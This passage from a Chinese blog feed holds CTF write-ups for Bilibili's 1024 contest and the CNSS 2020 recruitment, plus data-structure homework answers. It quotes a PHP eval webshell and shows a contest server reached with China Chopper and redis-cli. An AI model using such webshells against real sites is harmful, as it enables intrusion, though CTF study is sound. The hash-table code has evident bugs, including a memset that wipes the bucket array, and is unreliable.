+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]))</span><br></pre></td></tr></table></figure></div><p>很明显的jsfuck加密方法，最初被黑客用于网页注入~<br>在Chrome浏览器粘贴运行可以直接解码<br>结果为： </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;var str1 &#x3D; &quot;\u7a0b\u5e8f\u5458\u6700\u591a\u7684\u5730\u65b9&quot;;</span><br><span class="line">var str2 &#x3D; &quot;bilibili1024havefun&quot;;</span><br><span class="line">console.log()&quot;</span><br></pre></td></tr></table></figure></div><p>str1的内容很容易看出是Unicode字符，经转化得到<strong>程序员最多的地方</strong><br>果断打开最大的<del>同性交友网站</del> Github！搜索bilibili1024havefun找到对应的Repository<br>拿到真·end.php的源码:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;filename end.php</span><br><span class="line"></span><br><span class="line">$bilibili &#x3D; &quot;bilibili1024havefun&quot;;</span><br><span class="line"></span><br><span class="line">$str &#x3D; intval($_GET[&#39;id&#39;]);</span><br><span class="line">$reg &#x3D; preg_match(&#39;&#x2F;\d&#x2F;is&#39;, $_GET[&#39;id&#39;]);</span><br><span class="line"></span><br><span class="line">if(!is_numeric($_GET[&#39;id&#39;]) and $reg !&#x3D;&#x3D; 1 and $str &#x3D;&#x3D;&#x3D; 1)&#123;</span><br><span class="line">$content &#x3D; file_get_contents($_GET[&#39;url&#39;]);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;文件路径猜解</span><br><span class="line">if (false)&#123;</span><br><span class="line">echo &quot;还差一点点啦～&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;你想要的不在这儿～&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div><p>传参id[]=1满足第一个条件，按照前面题目的格式api/ctf/x，不难猜出有api/ctf/6/flag.txt<br>考虑到这玩意也不是个flag，又想到图片隐写~于是另存为图片，打开就是flag啦<br>于是得到了Flag10:<code>2ebd3b08-47ffc478-b49a5f9d-f6099d65</code>（？？《关于我做第六题却得到了第十题Flag的事》</p><h1 id="Question-ID-7-接下来的旅程，需要少年自己去探索啦～"><a href="#Question-ID-7-接下来的旅程，需要少年自己去探索啦～" class="headerlink" title="Question_ID_7 接下来的旅程，需要少年自己去探索啦～"></a>Question_ID_7 接下来的旅程，需要少年自己去探索啦～</h1><p>题目地址:<code>NULL</code></p><h2 id="解析-6"><a href="#解析-6" class="headerlink" title="解析"></a>解析</h2><p>404</p><h1 id="Question-ID-8-接下来的旅程，需要少年自己去探索啦～"><a href="#Question-ID-8-接下来的旅程，需要少年自己去探索啦～" class="headerlink" title="Question_ID_8 接下来的旅程，需要少年自己去探索啦～"></a>Question_ID_8 接下来的旅程，需要少年自己去探索啦～</h1><p>题目地址:<code>NULL</code></p><h2 id="解析-7"><a href="#解析-7" class="headerlink" title="解析"></a>解析</h2><p>在NodeJS框架下解<br>需要库：redis<br>阶梯代码如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var redis &#x3D; require(&#39;redis&#39;),</span><br><span class="line">  RDS_PORT &#x3D; 6379,</span><br><span class="line">  RDS_HOST &#x3D; &#39;120.92.151.189&#39;,</span><br><span class="line">  RDS_OPTS &#x3D; &#123;&#125;,</span><br><span class="line">  client &#x3D; redis.createClient(RDS_PORT, RDS_HOST, RDS_OPTS);</span><br><span class="line"></span><br><span class="line">client.on(&#39;connect&#39;, function () &#123;</span><br><span class="line">  client.hgetall(&quot;flag8&quot;, (e, r) &#x3D;&gt; &#123;</span><br><span class="line">    console.dir(r);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><p>喜闻乐见的是，全国的带佬们都在用扫描，不排除还有爆破从而达成人肉DDOS的hhh<br>总而言之，服务器在挂的边缘疯狂试探，我愿称之为服务器的挂&amp;不挂二象性<br>多试几次~</p><p>返回结果：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag1&quot;</span><br><span class="line">&quot;3b96173a-b3df4cdd-22d4c15f-261e7309&quot;</span><br><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag2&quot;</span><br><span class="line">&quot;bd871042-1e09a130-3ddd4faa-cebdb048&quot;</span><br><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag3&quot;</span><br><span class="line">&quot;c7f7a7c2-28b7f895-5432152b-6410e042&quot;</span><br><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag4&quot;</span><br><span class="line">&quot;d338e3c8-93215105-258d79ba-b364e59c&quot;</span><br><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag5&quot;</span><br><span class="line">&quot;612d1886-044898af-6c1e9dba-b58ad075&quot;</span><br><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag6&quot;</span><br><span class="line">&quot;8aa6f15d-65e37c9b-78c2bc37-00ed5aee&quot;</span><br><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag7&quot;</span><br><span class="line">&quot;b78ce2aa-10d03327-f2035f4e-55c17689&quot;</span><br><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag8&quot;</span><br><span class="line">&quot;d436b982-2b81aa54-49a8d2db-87ab951a&quot;</span><br><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag9&quot;</span><br><span class="line">&quot;b3238659-b81512e6-3a307c74-9877ecc5&quot;</span><br><span class="line">[root@demo ~]# redis-cli -h 120.92.151.189 -p 6379 -r 1 get &quot;flag10&quot;</span><br><span class="line">&quot;e5653416-595b3d0c-4c2a57ee-c026350e&quot;</span><br></pre></td></tr></table></figure></div><p>我们得到了Flag8:<code>d436b982-2b81aa54-49a8d2db-87ab951a</code></p><h1 id="Question-ID-9-接下来的旅程，需要少年自己去探索啦～"><a href="#Question-ID-9-接下来的旅程，需要少年自己去探索啦～" class="headerlink" title="Question_ID_9 接下来的旅程，需要少年自己去探索啦～"></a>Question_ID_9 接下来的旅程，需要少年自己去探索啦～</h1><p>题目地址:<code>NULL</code></p><h2 id="解析-8"><a href="#解析-8" class="headerlink" title="解析"></a>解析</h2><p>404</p><h1 id="Question-ID-10-接下来的旅程，需要少年自己去探索啦～"><a href="#Question-ID-10-接下来的旅程，需要少年自己去探索啦～" class="headerlink" title="Question_ID_10 接下来的旅程，需要少年自己去探索啦～"></a>Question_ID_10 接下来的旅程，需要少年自己去探索啦～</h1><p>题目地址:<code>NULL</code></p><h2 id="解析-9"><a href="#解析-9" class="headerlink" title="解析"></a>解析</h2><p>404</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>6、7、9题截止目前还没有解出来<br>（史称679事件 <del>我还是太菜了啊TAT</del><br>总之Bilibili_2020_10_24_CTF的题目就做到这里了，虽然都是Web方向的题，但是还是存在着很多运气的成分<del>Administrator</del> /笑<br>对新手还是蛮友好的，前5题还是可以学到很多东西，特别是Web题里面的一些基础知识~</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bilibili </tag>
            
            <tag> PHP </tag>
            
            <tag> ctf </tag>
            
            <tag> Web </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 1024 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNSS2020_招新解析</title>
      <link href="/post/b5f19194.html"/>
      <url>/post/b5f19194.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p><strong>施工中！！！Coming Soon！！！</strong></p><h1 id="Web方向"><a href="#Web方向" class="headerlink" title="Web方向"></a>Web方向</h1><h2 id="Web-01-baby-Web-方向做题须知"><a href="#Web-01-baby-Web-方向做题须知" class="headerlink" title="Web_01_(baby)Web 方向做题须知"></a>Web_01_(baby)Web 方向做题须知</h2><h3 id="Web-方向做题须知"><a href="#Web-方向做题须知" class="headerlink" title="Web 方向做题须知"></a>Web 方向做题须知</h3><p>1.Web题目为每道题目描述里给出的链接地址所指向的web应用(所以不要在平台题目描述界面寻找flag了<br>2.flag格式统一为cnss{} 花括号中间为有意义的字符串，通常会以_区分单个单词<br>3.hint意为提示 是出题人给出的解题提示 并不要求你在flag提交处作答(x<br>4.当你成功得到flag时 flag一定是以cnss{}的形式显示的 所以不需要自己手动添加cnss{}(如果有那你找到的一定不是flag</p><h4 id="做题要求"><a href="#做题要求" class="headerlink" title="做题要求"></a>做题要求</h4><blockquote><p>要会看HTML源码<br>能读懂简单的PHP代码<br>懂一点点HTTP报文<br>学会使用burpsuite的repeater模块</p></blockquote><h4 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h4><blockquote><p>burpsuite<br>metasploit<br>AntSword<br>f12开发者工具 插件如hackbar等<br>ps:浏览器请使用 firefox/chrome</p></blockquote><h4 id="学习参考"><a href="#学习参考" class="headerlink" title="学习参考"></a>学习参考</h4><blockquote><p>学会使用搜索引擎搜索关键字以找到自己需要的学习资料<br>从别人的博客文章/官方文档中学习<br>书籍和视频中学到的大多是系统全面的知识，但是相应的效率便低了<br>针对性学习和系统性学习，需要每个人结合自身情况进行均衡</p></blockquote><p><code>cnss{flag_is_just_like_this}</code></p><h2 id="Web-02-baby-卖菜刀"><a href="#Web-02-baby-卖菜刀" class="headerlink" title="Web_02_(baby)卖菜刀"></a>Web_02_(baby)卖菜刀</h2><blockquote><p>卖菜刀，卖菜刀，3 元 1 把，10 元 3 把。<br>快让 X5tar 看看你的菜刀锋利不锋利！</p></blockquote><p><a href="http://recruit.x5tar.com:60003/" target="_blank" rel="noopener">http://recruit.x5tar.com:60003/</a></p><p><strong>PS：被某些杀软报毒属于正常现象，可以放心做题，本题不会对你的电脑产生任何不利影响</strong></p><p><em>hint1：PHP 一句话木马</em><br><em>hint2：也许黑色蒙蔽了你的双眼（</em></p><h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>F12审查元素之后，发现网页源码中有这样一句<br><code>?php @eval($_POST[&#39;x5tar&#39;]);</code><br>显然是一个标准格式的一句话木马，而且出题人已经将连接的密码给出来了，即‘’中的内容x5tar<br>于是直接用菜刀连接，笔者采用的是2011版本的中国菜刀<br>链接填写<em><a href="http://recruit.x5tar.com:60003/" target="_blank" rel="noopener">http://recruit.x5tar.com:60003/</a></em>,脚本类型选择PHP，编码标准不做改动，单击“连接”<br>成功连接之后，即可取得控制权限，在网页源码文件夹下找到一名为flag的文件，打开<br>发现 <code>cnss{The_fl4g_1n_/_is_fak3}</code> 出题人居然留了一手，好气！<br>依据提示，我们返回根目录下，发现真正的flag文件，打开为 <code>cnss{y0ur_ca1da0_1s_aw3s0m3}</code><br>Binggo！我们终于得到了正确的flag!</p><h2 id="Web-03-baby-更简单的计算题"><a href="#Web-03-baby-更简单的计算题" class="headerlink" title="Web_03_(baby)更简单的计算题"></a>Web_03_(baby)更简单的计算题</h2><p>有人说夏令营的计算题太难，怎么可能在一秒内算出🌶么大的数<br>所以招新出了一个更加简单的计算题<br>但是让你算出答案又能怎样<br><strong>你真的可以提交吗？</strong></p><p><a href="http://recruit.x5tar.com:60002/" target="_blank" rel="noopener">http://recruit.x5tar.com:60002/</a></p><p><em>hint1：HTML 属性</em><br><em>hint2：试试 F12？</em></p><h3 id="解析-1"><a href="#解析-1" class="headerlink" title="解析"></a>解析</h3><p>惯例，先观察页面。发现是一个8位数的加法，但是输入框只能填写5位数字！<br>F12检察元素，发现这样一行<br><code>input type=&quot;text&quot; name=&quot;re&quot; maxlength=&quot;5&quot;</code><br>显然，它限制了我们提交答案的位数，直接更改之<br>但是发现，我们更改完成之后，“提交”的选项卡直接灰了，我们再回去看审查元素<br><code>input type=&quot;submit&quot; value=&quot;提交&quot; disabled=&quot;&quot;</code><br>这样一行禁止了我们使用提交按钮。于是将其状态改为abled即可<br>提交正确的计算结果后我们直接在页面上得到返回的flag<br><code>恭喜你，计算正确🎉cnss{no_one_kno3s_htm1_b3tt3r_than_u}</code></p><h2 id="Web-04-easy-最好的语言？"><a href="#Web-04-easy-最好的语言？" class="headerlink" title="Web_04_(easy)最好的语言？"></a>Web_04_(easy)最好的语言？</h2><p>你知道最好的语言是什么吗？<br>没错！当然就是超有趣的 PHP 辣！</p><p><a href="http://recruit.x5tar.com:60004/" target="_blank" rel="noopener">http://recruit.x5tar.com:60004/</a></p><p><em>hint1：PHP 反序列化</em><br><em>hint2：CVE-2016-7124</em><br><em>hint3：protected 和 private 属性的序列化</em></p><h3 id="解析-2"><a href="#解析-2" class="headerlink" title="解析"></a>解析</h3><h2 id="施工中！！！Coming-Soon！！！"><a href="#施工中！！！Coming-Soon！！！" class="headerlink" title="施工中！！！Coming Soon！！！"></a><strong>施工中！！！Coming Soon！！！</strong></h2><h1 id="Reverse方向"><a href="#Reverse方向" class="headerlink" title="Reverse方向"></a>Reverse方向</h1><h2 id="Reverse-01-Baby-C-Code"><a href="#Reverse-01-Baby-C-Code" class="headerlink" title="Reverse_01_Baby C Code"></a>Reverse_01_Baby C Code</h2><p>题目要求<br>请运行并分析以下C++语言代码，找到满足条件的 flag</p><p>前置知识<br>1.流程控制<br>2.位运算</p><blockquote><p>#include <cstdio><br>#include <cstring><br>char flag[31];<br>char code[]={x8<br>0x9c,0x91,0x8c,0x8c,0x84,0x88,0xcc,0x93,0x9c,0xcf,<br>0x92,0x9a,0xa0,0xc8,0x90,0xa0,0x8d,0xcc,0x89,0xcc,<br>0x8d,0xca,0x9a,0xa0,0x88,0xcf,0x8d,0xce,0x9b,0x82};<br>int main()<br>{<br>    scanf(“%30s”,flag);<br>    if (strlen(flag)!=30) return 0;<br>    for (int i=0;i&lt;30;i++) if (~flag[i]!=code[i]) return 0;<br>    printf(“Congratulation.”);<br>    return 0;<br>}</cstring></cstdio></p></blockquote><h3 id="解析-3"><a href="#解析-3" class="headerlink" title="解析"></a>解析</h3><p>简单的查看一下代码，发现验证逻辑非常简单<br>总体而言就是一种很常见的凯撒密码的变体，其中位移量i的取值范围从0到30<br>结合CNSS做题须知里面的flag格式，再观察到code数组之中第3,4位相同，我们不难推出：<br>0x8c对应的时flag中的‘s’ 由于0x8c对应DEC的140，而‘s’的ASCII码值为115，满足i取值范围<br>因此我们编写解码程序，确定偏移量为-25，之后以字符形式输出即可<br>得到flag——<code>cnss{w3lc0me_7o_r3v3r5e_w0r1d}</code></p><p>Hello World！</p><p>输出 “Hi, CNSS!” 获得 flag</p><p>源码中不允许包含井号，即源码中不允许出现#</p><p>本题编译参数为/usr/bin/g++ -O2 -w -fmax-errors=3 -std=c++14 -lm</p><p>小小的增加了难度</p><p>Hello 5， 它又回来了！</p><p>CNSS招新传统题目！</p><p>输出 “Hi, CNSS!” 获得flag</p><p>源码中不允许包含 %:?#({&lt;[]&gt;})</p><p>通过后请带着 submit id 联系我</p><p>点我获得flag</p><p>PS. 不要去爆栈网或者知乎提问</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> CNSS </tag>
            
            <tag> CTF </tag>
            
            <tag> flag </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Icoding平台第七次作业解析-查找</title>
      <link href="/post/420a3e9e.html"/>
      <url>/post/420a3e9e.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T1"><a href="#T1" class="headerlink" title="T1"></a>T1</h1><p>哈希表创建<br>哈希表（Hash Table，也叫散列表），是根据键（Key）而直接访问在内存存储位置的数据结构。也就是说，它通过计算一个关于键值的函数，将所需查询的数据映射到表中一个位置来访问记录，这加快了查找速度。这个映射函数称做哈希函数，存放记录的数组称做哈希表。哈希表相关定义如下：</p><blockquote><p>typedef enum{<br>    HASH_OK,<br>    HASH_ERROR,<br>    HASH_ADDED,<br>    HASH_REPLACED_VALUE,<br>   HASH_ALREADY_ADDED,<br>    HASH_DELETED,<br>    HASH_NOT_FOUND,<br>} HASH_RESULT;</p><p>typedef struct __HashEntry HashEntry;<br>struct __HashEntry{<br>    union{<br>        char  *str_value;<br>        double dbl_value;<br>        int       int_value;<br>    } key;<br>    union{<br>        char  *str_value;<br>        double dbl_value;<br>        int       int_value;<br>        long   long_value;<br>        void  *ptr_value;<br>    } value;<br>    HashEntry *next;<br>};</p><p>struct __HashTable{<br>    HashEntry **bucket;<br>    int size;<br>    HASH_RESULT last_error;<br>};<br>typedef struct __HashTable HashTable;</p><p>// 创建大小为hash_size的哈希表，创建成功后返回HashTable类型的指针，否则返回NULL。<br>HashTable *create_hash(int hash_size);</p><p>当成功插入顶点或边时，函数返回true，否则（如顶点或边已存在、插入边时顶点v或w不存在）返回false。</p></blockquote><p>哈希表相关说明：</p><blockquote><p>HASH_RESULT 类型为相关函数的返回类型<br>HashEntry 为哈希表所保存元素（即键值对 《key, value》）类型<br>HashTable 为哈希表，其中 bucket 指向大小为size的、元素类型为 HashEntry*的指针数组<br>哈希表采用链地址法处理冲突</p></blockquote><p>请实现 create_hash 函数，创建指定大小的哈希表。</p><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-06-22, Mon, 02:08:46</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;hash.h&quot;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">HashTable* create_hash(int size)</span><br><span class="line">&#123;</span><br><span class="line">    HashTable* H &#x3D; (HashTable*)malloc(sizeof(HashTable));</span><br><span class="line">    H-&gt;bucket &#x3D; (HashEntry**)malloc(sizeof(HashEntry**) * size);</span><br><span class="line">    if (!H-&gt;bucket) &#123;</span><br><span class="line">        free(H);</span><br><span class="line">        return NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    memset(H, 0, sizeof(HashTable));</span><br><span class="line">    H-&gt;size &#x3D; size;</span><br><span class="line">    return H;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T2"><a href="#T2" class="headerlink" title="T2"></a>T2</h1><p>哈希表添加</p><p>哈希表（Hash Table，也叫散列表），是根据键（Key）而直接访问在内存存储位置的数据结构。也就是说，它通过计算一个关于键值的函数，将所需查询的数据映射到表中一个位置来访问记录，这加快了查找速度。这个映射函数称做哈希函数，存放记录的数组称做哈希表。哈希表相关定义如下：</p><blockquote><p>typedef enum{<br>   HASH_OK,<br>   HASH_ERROR,<br>   HASH_ADDED,<br>   HASH_REPLACED_VALUE,<br>   HASH_ALREADY_ADDED,<br>   HASH_DELETED,<br>   HASH_NOT_FOUND,<br>} HASH_RESULT;</p><p>typedef struct __HashEntry HashEntry;<br>struct __HashEntry{<br>    union{<br>        char  *str_value;<br>        double dbl_value;<br>        int       int_value;<br>    } key;<br>    union{<br>       char  *str_value;<br>        double dbl_value;<br>        int       int_value;<br>        long   long_value;<br>        void  *ptr_value;<br>    } value;<br>    HashEntry *next;<br>};</p><p>struct __HashTable{<br>    HashEntry **bucket;<br>    int size;<br>    HASH_RESULT last_error;<br>};<br>typedef struct __HashTable HashTable;</p><p>// 向哈希表中添加元素，其中键类型为char*， 元素类型为int。<br>HASH_RESULT hash_add_int(HashTable * table, const char * key, int value);</p></blockquote><p>哈希表相关说明：</p><blockquote><p>HASH_RESULT 类型为相关函数的返回类型<br>HashEntry 为哈希表所保存元素（即键值对 《key, value》）类型<br>HashTable 为哈希表，其中 bucket 指向大小为size的、元素类型为 HashEntry*的指针数组<br>哈希表采用链地址法处理冲突</p></blockquote><p>请实现 hash_add_int 函数，向哈希表中添加元素，其中键类型为char*， 元素类型为int。在添加过程中，如果要添加的键值key已在哈希表中，且对应的值value也已存在，则函数返回 HASH_ALREADY_ADDED；如果要添加的键值key已在哈希表中，但对应的值value不同，则函数将value值更新到哈希表中，之后返回 HASH_REPLACED_VALUE；如果要添加的键值key不在哈希表中，则函数创建 HashEntry 类型，并将其加入到哈希表中，且函数返回 HASH_ADDED。本题所用的哈希函数如下：</p><blockquote><p>long hash_string(const char <em>str)<br>{<br>    long hash = 5381;<br>    int c;<br>    while (c = *str++)<br>        hash = ((hash &lt;&lt; 5) + hash) + c; /</em> hash * 33 + c */<br>    if(hash &lt; 0)<br>        hash *= -1;<br>    return hash;<br>}</p></blockquote><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-06-22, Mon, 02:10:56</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;hash.h&quot;</span><br><span class="line">#include &quot;stdlib.h&quot;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int Find(HashTable* table, const char* key, int value, long keyhash)</span><br><span class="line">&#123;</span><br><span class="line">    HashEntry* Head &#x3D; table-&gt;bucket[keyhash];</span><br><span class="line"></span><br><span class="line">    while (Head &amp;&amp; strcmp(Head-&gt;key.str_value, key)) &#123;</span><br><span class="line">        Head &#x3D; Head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!Head)</span><br><span class="line">        return -1;</span><br><span class="line">    else if (Head-&gt;value.int_value &#x3D;&#x3D; value)</span><br><span class="line">        return 1;</span><br><span class="line">    else &#123;</span><br><span class="line">        Head-&gt;value.int_value &#x3D; value;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HASH_RESULT hash_add_int(HashTable* table, const char* key, int value)</span><br><span class="line">&#123;</span><br><span class="line">    int p;</span><br><span class="line">    long keyhash &#x3D; hash_string(key) % table-&gt;size;</span><br><span class="line">    p &#x3D; Find(table, key, value, keyhash);</span><br><span class="line"></span><br><span class="line">    if (p &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        HashEntry* Node &#x3D; (HashEntry*)malloc(sizeof(HashEntry));</span><br><span class="line">        if (!Node)</span><br><span class="line">            return HASH_ERROR;</span><br><span class="line">        Node-&gt;key.str_value &#x3D; (char*)malloc(100);</span><br><span class="line">        if (Node-&gt;key.str_value &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">            return HASH_ERROR;</span><br><span class="line">        &#125;</span><br><span class="line">        Node-&gt;key.str_value &#x3D; (char*)key;</span><br><span class="line">        Node-&gt;value.int_value &#x3D; value;</span><br><span class="line">        &#x2F;&#x2F;Node-&gt;next &#x3D; table-&gt;bucket[keyhash]; &#x2F;&#x2F;？</span><br><span class="line">        table-&gt;bucket[keyhash] &#x3D; Node;</span><br><span class="line">        return HASH_ADDED;</span><br><span class="line">    &#125; else if (p &#x3D;&#x3D; 0)</span><br><span class="line">        return HASH_REPLACED_VALUE;</span><br><span class="line">    else</span><br><span class="line">        return HASH_ALREADY_ADDED;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T3"><a href="#T3" class="headerlink" title="T3"></a>T3</h1><p>AVL添加</p><p>平衡二叉树，是一种二叉排序树，其中每个结点的左子树和右子树的高度差至多等于1。它是一种高度平衡的二叉排序树。现二叉平衡树结点定义如下：</p><blockquote><p>typedef struct node<br>{<br>    int val;<br>    struct node *left;<br>    struct node *right;<br>    struct node *parent;<br>    int height;<br>} node_t;</p></blockquote><p>请实现平衡二叉树的插入算法：</p><blockquote><p>//向根为 root 的平衡二叉树插入新元素 val，成功后返回新平衡二叉树根结点<br>node_t *avl_insert(node_t *root, int val);</p></blockquote><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 